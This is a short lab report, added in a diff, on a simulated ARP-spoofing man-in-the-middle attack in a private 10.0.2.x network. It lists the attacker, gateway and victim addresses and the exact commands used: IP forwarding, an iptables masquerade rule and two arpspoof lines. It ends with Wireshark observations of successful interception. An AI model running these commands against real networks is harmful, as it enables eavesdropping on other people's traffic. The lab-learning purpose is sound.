@@ -1,0 +1,28 @@
+MITM Simulation Analysis Report
+Date: April 2025
+
+Network Details:
+- Attacker IP: 10.0.2.15
+- Gateway IP: 10.0.2.2
+- Victim IP: 10.0.2.4
+- Interface: eth0
+
+Tools Used:
+- Wireshark for monitoring
+- arpspoof for MITM
+
+Commands Executed:
+- sudo sysctl -w net.ipv4.ip_forward=1
+- sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+- sudo arpspoof -i eth0 -t 10.0.2.4 10.0.2.2
+- sudo arpspoof -i eth0 -t 10.0.2.2 10.0.2.4
+
+Observations in Wireshark
+- Repeated ARP broadcast packets indicating spoofing
+- The ARP tables (as seen through ARP packets) shows victim and gateway associating our MAC address with each other.
+- Additional IP traffic captured between the victim and gateway.
+
+Conclusion:
+- The MITM attack was successful. 
+- The attacker intercepted communications between the victim and gateway.
+
